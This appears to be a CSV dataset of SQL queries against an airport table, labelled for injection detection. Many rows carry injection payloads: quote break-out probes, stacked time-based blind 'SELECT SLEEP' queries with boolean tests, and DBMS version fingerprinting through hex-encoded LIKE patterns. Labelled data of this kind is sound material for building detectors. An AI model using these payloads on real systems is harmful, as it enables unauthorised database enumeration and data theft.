full_query,label,template_id,malicious_input,malicious_input_desc
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT(.()',""(()';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT'zVJqvv<'"">aWhibB';",1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT');SELECT SLEEP(5)#';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT SLEEP(5)#';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT SLEEP(0)#';,1,airport-S1,Unknown,Unknown
SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT SLEEP(5)#';,1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((29=29),SLEEP(5),2177)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((29=80),SLEEP(5),8059)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((29=100),SLEEP(5),2088)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((100=80),SLEEP(5),5178)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((80=80),SLEEP(5),9387)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((100 80),SLEEP(5),9021)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((27=27),SLEEP(5),5521)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((27=47),SLEEP(5),1993)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((27=82),SLEEP(5),5136)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((82=47),SLEEP(5),2501)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((47=47),SLEEP(5),1603)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((82 47),SLEEP(5),5089)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((30=30),SLEEP(5),5151)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((30=42),SLEEP(5),6028)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((30=74),SLEEP(5),3883)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((74=42),SLEEP(5),9983)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((42=42),SLEEP(5),7809)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((74 42),SLEEP(5),7489)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((22=22),SLEEP(5),1505)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((22=28),SLEEP(5),8034)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((22=75),SLEEP(5),8258)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((75=28),SLEEP(5),2897)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((28=28),SLEEP(5),2415)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((75 28),SLEEP(5),7977)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((11=11),SLEEP(5),2546)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((11=30),SLEEP(5),1048)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((11=81),SLEEP(5),9349)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((81=30),SLEEP(5),5605)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((30=30),SLEEP(5),3576)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((81 30),SLEEP(5),3200)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((2500=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                2500),SLEEP(5),9230)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((8030>8029),SLEEP(5),8766)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((QUARTER(NULL XOR NULL) IS NULL),SLEEP(5),6790)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((SESSION_USER() LIKE USER()),SLEEP(5),8119)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((ISNULL(JSON_STORAGE_FREE(NULL))),SLEEP(5),6111)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((VERSION() LIKE 0x254d61726961444225),SLEEP(1),9052)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((VERSION() LIKE 0x255469444225),SLEEP(1),8945)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((@@VERSION_COMMENT LIKE 0x256472697a7a6c6525),SLEEP(1),7733)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((@@VERSION_COMMENT LIKE 0x25506572636f6e6125),SLEEP(1),9439)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((AURORA_VERSION() LIKE 0x25),SLEEP(1),7724)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((1714=1714/* NoValue */),SLEEP(1),1714)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((6597=6597/*!80300 AND 9270=3066*/),SLEEP(1),6597)#';",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = 'AGBT';SELECT IF((1181=1181/*!80302 AND 8721=9415*/),SLEEP(1),1181)#';",1,airport-S1,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24((())..'"".",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24'jyYYLR<'"">lJrPZG",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
"SELECT id, name, icao_code FROM airport WHERE elevation_ft BETWEEN 25.0 AND 24",1,airport-S2,Unknown,Unknown
